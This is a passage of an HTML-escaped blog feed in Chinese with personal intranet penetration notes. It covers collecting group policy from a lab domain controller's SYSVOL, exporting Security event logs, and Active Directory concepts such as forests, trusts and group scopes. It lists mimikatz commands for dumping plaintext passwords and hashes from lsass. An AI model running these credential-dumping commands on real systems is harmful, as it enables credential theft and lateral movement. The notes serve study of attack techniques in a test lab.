	&lt;a href=&#34;https://coollllllll.github.io/p/intranet-2/image-20220205180507399.png&#34; data-size=&#34;674x452&#34;&gt;
		&lt;img src=&#34;https://coollllllll.github.io/p/intranet-2/image-20220205180507399.png&#34;
			width=&#34;674&#34;
			height=&#34;452&#34;
			srcset=&#34;https://coollllllll.github.io/p/intranet-2/image-20220205180507399_hu3b2e019a91b05c897cdb43e16e0ca315_226741_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/intranet-2/image-20220205180507399_hu3b2e019a91b05c897cdb43e16e0ca315_226741_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 105; 
			flex-basis: 253px&#34;
	&gt;
	&lt;a href=&#34;https://coollllllll.github.io/p/intranet-2/image-20220205180653764.png&#34; data-size=&#34;463x438&#34;&gt;
		&lt;img src=&#34;https://coollllllll.github.io/p/intranet-2/image-20220205180653764.png&#34;
			width=&#34;463&#34;
			height=&#34;438&#34;
			srcset=&#34;https://coollllllll.github.io/p/intranet-2/image-20220205180653764_hu11ac7fe66e99589ec015b09209deba14_19852_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/intranet-2/image-20220205180653764_hu11ac7fe66e99589ec015b09209deba14_19852_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;主机信息&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 279; 
			flex-basis: 670px&#34;
	&gt;
	&lt;a href=&#34;https://coollllllll.github.io/p/intranet-2/image-20220205181053604.png&#34; data-size=&#34;1131x405&#34;&gt;
		&lt;img src=&#34;https://coollllllll.github.io/p/intranet-2/image-20220205181053604.png&#34;
			width=&#34;1131&#34;
			height=&#34;405&#34;
			srcset=&#34;https://coollllllll.github.io/p/intranet-2/image-20220205181053604_hua7c32bce22a9a4a38be3428f7ea060eb_16425_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/intranet-2/image-20220205181053604_hua7c32bce22a9a4a38be3428f7ea060eb_16425_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;针对某些未知含义的时间信息，可以用&lt;code&gt;Get-Date&lt;/code&gt;去解析。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&#34;组策略获取及分析&#34;&gt;组策略获取及分析&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;组策略存放位置：&lt;/strong&gt;&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;\$DCServer\sysvol\域名\policies
\$DCServer\sysvol\域名\scripts (用户登录之后需不需要执行脚本)
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;组策略获取：&lt;/strong&gt;&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;# IPC连接DC
net use \\DC.hack.testlab
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 656; 
			flex-basis: 1575px&#34;
	&gt;
	&lt;a href=&#34;https://coollllllll.github.io/p/intranet-2/image-20220205200746055.png&#34; data-size=&#34;315x48&#34;&gt;
		&lt;img src=&#34;https://coollllllll.github.io/p/intranet-2/image-20220205200746055.png&#34;
			width=&#34;315&#34;
			height=&#34;48&#34;
			srcset=&#34;https://coollllllll.github.io/p/intranet-2/image-20220205200746055_hu01f71a952a008d7b71ba46513152cab8_1257_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/intranet-2/image-20220205200746055_hu01f71a952a008d7b71ba46513152cab8_1257_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;# 查看共享资源
net view \\DC.hack.testlab
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 189; 
			flex-basis: 454px&#34;
	&gt;
	&lt;a href=&#34;https://coollllllll.github.io/p/intranet-2/image-20220205200907001.png&#34; data-size=&#34;352x186&#34;&gt;
		&lt;img src=&#34;https://coollllllll.github.io/p/intranet-2/image-20220205200907001.png&#34;
			width=&#34;352&#34;
			height=&#34;186&#34;
			srcset=&#34;https://coollllllll.github.io/p/intranet-2/image-20220205200907001_hu359df50a656de8027263bc76d80d25d9_4287_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/intranet-2/image-20220205200907001_hu359df50a656de8027263bc76d80d25d9_4287_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;# 列出共享文件夹下的资源
dir \\DC.hack.testlab\sysvol\hack.testlab\

dir \\DC.hack.testlab\sysvol\hack.testlab\Policies
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 282; 
			flex-basis: 677px&#34;
	&gt;
	&lt;a href=&#34;https://coollllllll.github.io/p/intranet-2/image-20220205203133618.png&#34; data-size=&#34;477x169&#34;&gt;
		&lt;img src=&#34;https://coollllllll.github.io/p/intranet-2/image-20220205203133618.png&#34;
			width=&#34;477&#34;
			height=&#34;169&#34;
			srcset=&#34;https://coollllllll.github.io/p/intranet-2/image-20220205203133618_hu84356fee9f9c2e44a69386e07ad57547_3834_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/intranet-2/image-20220205203133618_hu84356fee9f9c2e44a69386e07ad57547_3834_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 413; 
			flex-basis: 992px&#34;
	&gt;
	&lt;a href=&#34;https://coollllllll.github.io/p/intranet-2/image-20220205203342846.png&#34; data-size=&#34;703x170&#34;&gt;
		&lt;img src=&#34;https://coollllllll.github.io/p/intranet-2/image-20220205203342846.png&#34;
			width=&#34;703&#34;
			height=&#34;170&#34;
			srcset=&#34;https://coollllllll.github.io/p/intranet-2/image-20220205203342846_hudfb0d2c77125379cee31704ab98f4663_4948_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/intranet-2/image-20220205203342846_hudfb0d2c77125379cee31704ab98f4663_4948_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;# 拷贝策略文件
xcopy.exe \\DC.hack.testlab\sysvol\hack.testlab\Policies . /E
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;分析组策略的功能和作用域-使用&lt;code&gt;Policy Analyzer&lt;/code&gt; 工具：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;该工具会将所导入的组策略与本地组策略进行对比分析。&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 152; 
			flex-basis: 367px&#34;
	&gt;
	&lt;a href=&#34;https://coollllllll.github.io/p/intranet-2/image-20220205210156729.png&#34; data-size=&#34;988x646&#34;&gt;
		&lt;img src=&#34;https://coollllllll.github.io/p/intranet-2/image-20220205210156729.png&#34;
			width=&#34;988&#34;
			height=&#34;646&#34;
			srcset=&#34;https://coollllllll.github.io/p/intranet-2/image-20220205210156729_hu5ed5acf4060a0fb646fdd76425898c26_62311_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/intranet-2/image-20220205210156729_hu5ed5acf4060a0fb646fdd76425898c26_62311_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;h2 id=&#34;口令ntlm获取及分析&#34;&gt;口令NTLM获取及分析&lt;/h2&gt;
&lt;h3 id=&#34;mimikatz工具&#34;&gt;mimikatz工具&lt;/h3&gt;
&lt;p&gt;&lt;strong&gt;常用命令:&lt;/strong&gt;&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;privilege::debug //权限提升
sekurlsa::logonpasswords //抓取明文密码
lsadump::lsa /patch //通过转储lsass.exe进程对散列值进行dump
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 420; 
			flex-basis: 1008px&#34;
	&gt;
	&lt;a href=&#34;https://coollllllll.github.io/p/intranet-2/image-20220209212430445.png&#34; data-size=&#34;336x80&#34;&gt;
		&lt;img src=&#34;https://coollllllll.github.io/p/intranet-2/image-20220209212430445.png&#34;
			width=&#34;336&#34;
			height=&#34;80&#34;
			srcset=&#34;https://coollllllll.github.io/p/intranet-2/image-20220209212430445_hu62fa866f845f5d31d26c4e80e7fbc81a_1784_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/intranet-2/image-20220209212430445_hu62fa866f845f5d31d26c4e80e7fbc81a_1784_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;h2 id=&#34;安全日志获取及分析&#34;&gt;安全日志获取及分析&lt;/h2&gt;
&lt;p&gt;所在路径：&lt;code&gt;C:\Windows\System32\winevt\Logs\Security.evtx&lt;/code&gt;，从日志中想要获得的相关信息：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;高权限用户的登录&lt;/li&gt;
&lt;li&gt;特定账号的登录&lt;/li&gt;
&lt;li&gt;远程桌面的登录&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;获取方式&#34;&gt;获取方式&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;文件拷贝&lt;/li&gt;
&lt;li&gt;&lt;code&gt;Get-EventLog-LogName Security | Format-List -Property * | Out-File result.txt&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;分析&#34;&gt;分析&lt;/h3&gt;
&lt;h4 id=&#34;系统自带工具&#34;&gt;系统自带工具&lt;/h4&gt;
&lt;p&gt;需要明确一些事件id的含义，方便筛选。&lt;/p&gt;
&lt;p&gt;筛选事件id：&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 97; 
			flex-basis: 234px&#34;
	&gt;
	&lt;a href=&#34;https://coollllllll.github.io/p/intranet-2/image-20220209213657423.png&#34; data-size=&#34;527x539&#34;&gt;
		&lt;img src=&#34;https://coollllllll.github.io/p/intranet-2/image-20220209213657423.png&#34;
			width=&#34;527&#34;
			height=&#34;539&#34;
			srcset=&#34;https://coollllllll.github.io/p/intranet-2/image-20220209213657423_hu40f05454449a4177a99bf3b23bbe857a_29833_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/intranet-2/image-20220209213657423_hu40f05454449a4177a99bf3b23bbe857a_29833_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;h4 id=&#34;log-parser&#34;&gt;Log Parser&lt;/h4&gt;
&lt;p&gt;..&lt;/p&gt;
</description>
        </item>
        <item>
        <title>域相关概念</title>
        <link>https://coollllllll.github.io/p/intranet-1/</link>
        <pubDate>Fri, 10 Sep 2021 00:00:00 +0000</pubDate>
        
        <guid>https://coollllllll.github.io/p/intranet-1/</guid>
        <description>&lt;img src="https://coollllllll.github.io/p/intranet-1/pawel-czerwinski-8uZPynIu-rQ-unsplash.jpg" alt="Featured image of post 域相关概念" /&gt;&lt;h1 id=&#34;域相关概念&#34;&gt;域相关概念&lt;/h1&gt;
&lt;p&gt;应用服务器区：OA、开发、数据库等&lt;/p&gt;
&lt;p&gt;网络代理：内网出网代理、多层代理&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 161; 
			flex-basis: 386px&#34;
	&gt;
	&lt;a href=&#34;https://coollllllll.github.io/p/intranet-1/image-20211222221813292.png&#34; data-size=&#34;1606x996&#34;&gt;
		&lt;img src=&#34;https://coollllllll.github.io/p/intranet-1/image-20211222221813292.png&#34;
			width=&#34;1606&#34;
			height=&#34;996&#34;
			srcset=&#34;https://coollllllll.github.io/p/intranet-1/image-20211222221813292_hub56d1c251281ea92a0554a036bd1f903_457053_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/intranet-1/image-20211222221813292_hub56d1c251281ea92a0554a036bd1f903_457053_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;场景&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;原本DMZ区是不能访问内网的，比如DMZ区有邮件服务器(可以有两种认证实现：第一种即自己构建认证机制；第二种是依赖认证服务器进行认证)，如果采用第二种认证实现：依赖于内网的认证服务器，那么一旦DMZ区沦陷就会将认证服务器暴露出来&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;折合解决方法&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;在DMZ区建一台域服务器，要求该域服务器只能从内网认证服务器进行读，而不能向内网认证服务器进行写。&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 135; 
			flex-basis: 324px&#34;
	&gt;
	&lt;a href=&#34;https://coollllllll.github.io/p/intranet-1/image-20220112220130657.png&#34; data-size=&#34;716x530&#34;&gt;
		&lt;img src=&#34;https://coollllllll.github.io/p/intranet-1/image-20220112220130657.png&#34;
			width=&#34;716&#34;
			height=&#34;530&#34;
			srcset=&#34;https://coollllllll.github.io/p/intranet-1/image-20220112220130657_huc1ae32db266abf05f1d7b3ff00b094b1_207695_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/intranet-1/image-20220112220130657_huc1ae32db266abf05f1d7b3ff00b094b1_207695_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;DSRM password：恢复模式密码，当自身故障不能恢复时，需要大的xx来进行恢复&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&#34;基本概念&#34;&gt;基本概念&lt;/h2&gt;
&lt;h3 id=&#34;域domain&#34;&gt;域(Domain)&lt;/h3&gt;
&lt;p&gt;域是企业网络中人为定义的一组计算机和用户的集合，目的是统一集中管理，具有严格的安全边界(一个域中的用户无法访问另一个域中的资源)&lt;/p&gt;
&lt;h3 id=&#34;域控制器domain-server&#34;&gt;域控制器(Domain Server)&lt;/h3&gt;
&lt;p&gt;域内一台具备管理功能的服务器。域控制器负责所有连入的计算机和用户的验证工作(存放活动目录)。&lt;/p&gt;
&lt;h4 id=&#34;作用&#34;&gt;作用&lt;/h4&gt;
&lt;p&gt;其存在由这个域的账户、密码、属于这个域的计算机等信息构成的数据库。当计算机要进入域，DS首先鉴别该计算机是否属于这个域，以及用户使用的账号是否存在、密码是否正确。&lt;/p&gt;
&lt;h3 id=&#34;域中的环境&#34;&gt;域中的环境&lt;/h3&gt;
&lt;h4 id=&#34;父子域&#34;&gt;&lt;strong&gt;父子域&lt;/strong&gt;&lt;/h4&gt;
&lt;p&gt;一般同一个域内的信息交互式非常多的，且不压缩，占用带宽较大，所以需要在网络中划分多个域，多个域之间的交互式较少的，且可以压缩。第一个域称为父域，各分部的域称为该域的子域。&lt;/p&gt;
&lt;p&gt;第一种-自己划分形成父子域：&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 135; 
			flex-basis: 324px&#34;
	&gt;
	&lt;a href=&#34;https://coollllllll.github.io/p/intranet-1/image-20220112220621926.png&#34; data-size=&#34;738x546&#34;&gt;
		&lt;img src=&#34;https://coollllllll.github.io/p/intranet-1/image-20220112220621926.png&#34;
			width=&#34;738&#34;
			height=&#34;546&#34;
			srcset=&#34;https://coollllllll.github.io/p/intranet-1/image-20220112220621926_hu84f8613788669e41657624cc2aa27e30_172592_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/intranet-1/image-20220112220621926_hu84f8613788669e41657624cc2aa27e30_172592_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;第二种-建立和其他域的信任关系形成父子域：&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 170; 
			flex-basis: 409px&#34;
	&gt;
	&lt;a href=&#34;https://coollllllll.github.io/p/intranet-1/image-20220112221449631.png&#34; data-size=&#34;791x464&#34;&gt;
		&lt;img src=&#34;https://coollllllll.github.io/p/intranet-1/image-20220112221449631.png&#34;
			width=&#34;791&#34;
			height=&#34;464&#34;
			srcset=&#34;https://coollllllll.github.io/p/intranet-1/image-20220112221449631_hu05c52e319f8c5f482b33740f09ee2cf9_167409_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/intranet-1/image-20220112221449631_hu05c52e319f8c5f482b33740f09ee2cf9_167409_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;h4 id=&#34;域森林&#34;&gt;&lt;strong&gt;域森林&lt;/strong&gt;&lt;/h4&gt;
&lt;p&gt;域树(父子域)通过建立&lt;strong&gt;信任关系&lt;/strong&gt;组成集合成为域森林。&lt;/p&gt;
&lt;h4 id=&#34;域森林间&#34;&gt;域森林间&lt;/h4&gt;
&lt;p&gt;森林与森林间建立信任关系：&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 185; 
			flex-basis: 446px&#34;
	&gt;
	&lt;a href=&#34;https://coollllllll.github.io/p/intranet-1/image-20220112221844119.png&#34; data-size=&#34;775x417&#34;&gt;
		&lt;img src=&#34;https://coollllllll.github.io/p/intranet-1/image-20220112221844119.png&#34;
			width=&#34;775&#34;
			height=&#34;417&#34;
			srcset=&#34;https://coollllllll.github.io/p/intranet-1/image-20220112221844119_hu2b5cf4b374ee0338369c54521c06959e_92369_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/intranet-1/image-20220112221844119_hu2b5cf4b374ee0338369c54521c06959e_92369_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;h4 id=&#34;域名服务器&#34;&gt;&lt;strong&gt;域名服务器&lt;/strong&gt;&lt;/h4&gt;
&lt;p&gt;域中的计算机使用DNS来定位域控制器、服务器及其他计算机、网络服务的，所以域的名字就是DNS域的名字。&lt;/p&gt;
&lt;p&gt;内网环境中，一般是通过寻找DNS服务器来确定域控制器的位置(DNS服务器和域控制器一般配置在同一台机器上)。&lt;/p&gt;
&lt;h3 id=&#34;活动目录&#34;&gt;活动目录&lt;/h3&gt;
&lt;p&gt;目录用于存储有关网络对象(用户、组、计算机、共享资源、打印机和联系人等)的信息。目录服务帮助用户快速、准确找到其所需要的信息。活动目录的实现为企业提供了网络环境的集中式管理机制。&lt;/p&gt;
&lt;p&gt;活动目录更像一本字典的索引。&lt;/p&gt;
&lt;h4 id=&#34;举例&#34;&gt;举例&lt;/h4&gt;
&lt;p&gt;甲公司分有财务科、人事科等，分为为每个科建立一个域，可将这几个域构成域树交给甲公司管理；甲公司、乙公司等属于A集团，那么每个公司的域树可构成域森林交给A集团管理。因此A集团可以按**&amp;ldquo;A集团(域森林)-&amp;gt;子公司(域树)-&amp;gt;部门(域)-&amp;gt;员工&amp;quot;的方式对网络进行层次分明的管理**。&lt;/p&gt;
&lt;h4 id=&#34;功能&#34;&gt;功能&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;账号集中管理：所有账号均存储在服务器中&lt;/li&gt;
&lt;li&gt;软件集中管理：统一推送软件、安装网络打印机等&lt;/li&gt;
&lt;li&gt;环境集中管理：统一客户端桌面、TCP/IP协议等设置&lt;/li&gt;
&lt;li&gt;增强安全性：统一部署杀毒软件和病毒扫描任务、集中管理用户计算机权限、统一制定用户密码策略&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;ds和活动目录的关系&#34;&gt;DS和活动目录的关系&lt;/h3&gt;
&lt;p&gt;在规模较大的网络中，将计算机、用户、用户组、打印机、共享文件等多个对象有序放在一起，并将检索信息整理好以便查找和使用。这个拥有层次结构的数据库就是活动目录数据库，简称AD库。&lt;/p&gt;
&lt;p&gt;将AD库放在一台计算机上，那么这台计算机就称为DC。&lt;/p&gt;
&lt;h2 id=&#34;域中计算机的分类&#34;&gt;域中计算机的分类&lt;/h2&gt;
&lt;h3 id=&#34;域控制器&#34;&gt;域控制器&lt;/h3&gt;
&lt;p&gt;用于管理所有的网络访问。&lt;/p&gt;
&lt;p&gt;可以有多台计算机被配置为DS，以分担用户的登录、访问操作。多个DS可以一起工作，自动备份用户账户和活动目录数据。&lt;/p&gt;
&lt;h3 id=&#34;成员服务器&#34;&gt;成员服务器&lt;/h3&gt;
&lt;p&gt;加入了域但没有安装AD的应用服务器、文件服务器、数据库服务器等&lt;/p&gt;
&lt;h3 id=&#34;客户机&#34;&gt;客户机&lt;/h3&gt;
&lt;p&gt;用户利用客户机和域账号即可登录进入某个域。&lt;/p&gt;
&lt;h3 id=&#34;独立服务器&#34;&gt;独立服务器&lt;/h3&gt;
&lt;p&gt;独立服务器和域没有关系。即：不加入域也不安装AD。&lt;/p&gt;
&lt;h2 id=&#34;域分组&#34;&gt;域分组&lt;/h2&gt;
&lt;p&gt;组是用户账号的集合。通过向一组用户分配权限，就可不必为每个用户分别分配权限。&lt;/p&gt;
&lt;h3 id=&#34;域本地组&#34;&gt;域本地组&lt;/h3&gt;
&lt;p&gt;只能作用于特定对象，例如证书发布、打印操作、备份操作等。&lt;/p&gt;
&lt;h3 id=&#34;全局组&#34;&gt;全局组&lt;/h3&gt;
&lt;p&gt;只能作用于本域，不能跨域或跨森林。&lt;/p&gt;
&lt;p&gt;一般每个全局组都有一个自己的名字，以便区分和使用。&lt;/p&gt;
&lt;h3 id=&#34;通用组&#34;&gt;通用组&lt;/h3&gt;
&lt;p&gt;作用于整个森林域，表示在整个森林内部的所有域间通用，因此该组的变动尽可能小(每次变动都要同步更新到全局数据库中)。&lt;/p&gt;
&lt;h3 id=&#34;组之间的关系&#34;&gt;组之间的关系&lt;/h3&gt;
&lt;p&gt;域本地组不能加入其他安全组；全局组可以加入到全局组、通用组、域本地组；通用组可以加入到通用组、域本地组&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;通用组涉及跨域，即其他域的成员可以加入通用组&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 118; 
			flex-basis: 284px&#34;
	&gt;
	&lt;a href=&#34;https://coollllllll.github.io/p/intranet-1/image-20220122173825170.png&#34; data-size=&#34;553x466&#34;&gt;
		&lt;img src=&#34;https://coollllllll.github.io/p/intranet-1/image-20220122173825170.png&#34;
			width=&#34;553&#34;
			height=&#34;466&#34;
			srcset=&#34;https://coollllllll.github.io/p/intranet-1/image-20220122173825170_hu5cf9b531e502b787abaaf2bb15417615_78676_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/intranet-1/image-20220122173825170_hu5cf9b531e502b787abaaf2bb15417615_78676_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;域本地组直接对应资源。一个用户加入域中，会被分配至某个全局组；而域本地组成员一般是全局组，全局组成员才是用户。&lt;/p&gt;
&lt;p&gt;通用组比较特殊，&lt;strong&gt;只存在于森林的根域中&lt;/strong&gt;，所以其成员只能是根域的全局组；同时，由于通用组作用范围为森林内部的所有域，所以当作用于特定域(例如下图中的A域)时，该通用组又隶属于A域的某个域本地组，得以访问A域的资源。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 136; 
			flex-basis: 328px&#34;
	&gt;
	&lt;a href=&#34;https://coollllllll.github.io/p/intranet-1/image-20220122181734194.png&#34; data-size=&#34;687x502&#34;&gt;
		&lt;img src=&#34;https://coollllllll.github.io/p/intranet-1/image-20220122181734194.png&#34;
			width=&#34;687&#34;
			height=&#34;502&#34;
			srcset=&#34;https://coollllllll.github.io/p/intranet-1/image-20220122181734194_hub712d4de5a76ddefea508c498a485e0e_117153_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/intranet-1/image-20220122181734194_hub712d4de5a76ddefea508c498a485e0e_117153_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 122; 
			flex-basis: 293px&#34;
	&gt;
	&lt;a href=&#34;https://coollllllll.github.io/p/intranet-1/image-20220312225632615.png&#34; data-size=&#34;1168x954&#34;&gt;
		&lt;img src=&#34;https://coollllllll.github.io/p/intranet-1/image-20220312225632615.png&#34;
			width=&#34;1168&#34;
			height=&#34;954&#34;
			srcset=&#34;https://coollllllll.github.io/p/intranet-1/image-20220312225632615_hu499e9b0edb0f1c3c7cef82dd5ae683f6_675283_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/intranet-1/image-20220312225632615_hu499e9b0edb0f1c3c7cef82dd5ae683f6_675283_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;例如Enterprise Admins是一个通用组，它的成员是：&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 370; 
			flex-basis: 888px&#34;
	&gt;
	&lt;a href=&#34;https://coollllllll.github.io/p/intranet-1/image-20220205154827059.png&#34; data-size=&#34;311x84&#34;&gt;
		&lt;img src=&#34;https://coollllllll.github.io/p/intranet-1/image-20220205154827059.png&#34;
			width=&#34;311&#34;
			height=&#34;84&#34;
			srcset=&#34;https://coollllllll.github.io/p/intranet-1/image-20220205154827059_hu920f8141ce3734228d61d29707128f53_4635_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/intranet-1/image-20220205154827059_hu920f8141ce3734228d61d29707128f53_4635_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;而当它作用于hack域时，又隶属于某个域本地组：&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 344; 
			flex-basis: 826px&#34;
	&gt;
	&lt;a href=&#34;https://coollllllll.github.io/p/intranet-1/image-20220205155036318.png&#34; data-size=&#34;348x101&#34;&gt;
		&lt;img src=&#34;https://coollllllll.github.io/p/intranet-1/image-20220205155036318.png&#34;
			width=&#34;348&#34;
			height=&#34;101&#34;
			srcset=&#34;https://coollllllll.github.io/p/intranet-1/image-20220205155036318_hua297b32815fd7db494e4eabdd34b2c68_5425_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/intranet-1/image-20220205155036318_hua297b32815fd7db494e4eabdd34b2c68_5425_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&#34;常见的组&#34;&gt;常见的组&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;域管理组(Domain Admins)&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;对域内所有控制器、服务器、主机和活动目录有完全的控制权限。隶属于Users容器，容器路径：&lt;code&gt;CN=Domain Admins,CN=Users,DC=hack,DC=testlab&lt;/code&gt;。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;管理员组(Administrators)&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;该组仅对域服务器和活动目录有完全控制权，是域本地组范畴。隶属于Builtin容器，容器路径：&lt;code&gt;CN=Administrators,CN=Builtin,DC=hack,DC=testlab&lt;/code&gt;。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;注意：&lt;/p&gt;
&lt;p&gt;Domain Admins和Administrators并不相同，前者为域全局组而后者为域本地组，且Domain Admins组是Administrators组的成员。&lt;/p&gt;
